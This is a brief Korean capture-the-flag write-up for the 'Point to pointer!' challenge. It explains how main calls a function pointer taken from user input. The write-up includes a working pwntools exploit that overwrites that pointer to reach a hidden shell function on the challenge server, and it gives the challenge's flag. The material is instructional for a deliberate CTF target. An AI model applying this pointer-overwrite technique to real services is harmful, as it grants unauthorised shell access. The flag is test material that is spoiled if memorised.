# Point to pointer!

###### 529p

>넘나 쉬운 문제 당신도 풀 수 있습니다!
>
>nc 222.110.147.52:42632
>
>[Link](https://drive.google.com/open?id=1DU8vjBw73skA7HUoNsl2RCn-U_Lb5g_1)

----

64비트 ELF파일을 준다.

0x4007A7에 쉘키는 함수가있는데 이 함수에 접근하는함수가 없다.

근데 main함수인 0x4007C2에 0x40088E에 `call edx`가 있다.

```assembly
mov rdx, [rax+0x10]
mov eax, 0
call rdx
```

자세히 보면 다음과 같은 어셈블리인데 위에서 read함수에서 받아온 값의 16째자리부터 64비트 정수를 받아서 해당 주소의 함수를 호출하는데 따라서 여기에 저 쉘키는 함수주소를 넣어주면 된다.

익스플로잇 코드는 다음과 같다

```python
from pwn import *

p=remote("222.110.147.52",42632)
payload=cyclic(16)
payload+=p64(0x4007A7)
p.sendline(payload)
payload="Y"
p.send(payload)
p.interactive()
```

-------

FLAG는 `FLAG{P0InT_2_pOiNt_2_PO1t3R!}`이다.